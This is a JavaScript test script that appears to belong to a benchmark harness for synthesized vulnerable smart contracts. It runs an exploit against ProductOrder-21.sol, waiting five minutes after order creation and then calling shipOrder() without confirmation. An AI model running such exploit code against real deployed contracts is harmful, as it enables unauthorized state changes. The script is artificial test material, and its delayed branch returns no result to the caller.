require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');

const { createLoggerWeb3 } = require('@lib/web3/deploy');


const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
let contractFileFullName = 'ProductOrder-21.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');


async function exploit(web3, envInfo, contractAddress) {
    try {   
        let solcVersion = extractSolcVersion(source);
        let { abi } = await compileWithVersion(source, contractFileFullName, 'ProductOrder', solcVersion);
        
        let contractInstance = new web3.eth.Contract(abi, contractAddress);

        console.log("Waiting for the time condition to meet for shipping without confirmation...");

        // Wait until 5 minutes past the order creation time
        let currentTime = Math.floor(Date.now() / 1000);
        let orderCreationTime = await contractInstance.methods.orderCreationTime().call();
        let targetTime = parseInt(orderCreationTime) + 300; // 5 minutes in seconds

        if (currentTime < targetTime) {
            // Set a timeout to wait until the 5-minute mark
            setTimeout(async () => {
                // Attempt to ship the order
                let shipReceipt = await contractInstance.methods.shipOrder().send({
                    from: web3.eth.accounts.wallet[0].address,
                    gas: 3000000
                });
                await sleep(200);

                if (shipReceipt.status) {
                    console.log("Order shipped successfully without proper confirmation.");
                    return true;
                } else {
                    console.error("Failed to ship order.");
                    return false;
                }
            }, (targetTime - currentTime) * 1000);
        } else {
            console.log("Already past the target time. Trying to ship the order...");
            let shipReceipt = await contractInstance.methods.shipOrder().send({
                from: web3.eth.accounts.wallet[0].address,
                gas: 3000000
            });
            await sleep(200);

            if (shipReceipt.status) {
                console.log("Order shipped successfully without proper confirmation.");
                return true;
            } else {
                console.error("Failed to ship order.");
                return false;
            }
        }
    } catch (error) {
        console.error("Failed to execute exploit due to:", error.stack);
        return false;
    }
}



module.exports = async function runTests(web3, envInfo, contractAddress) {
    web3 = await createLoggerWeb3(web3);
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
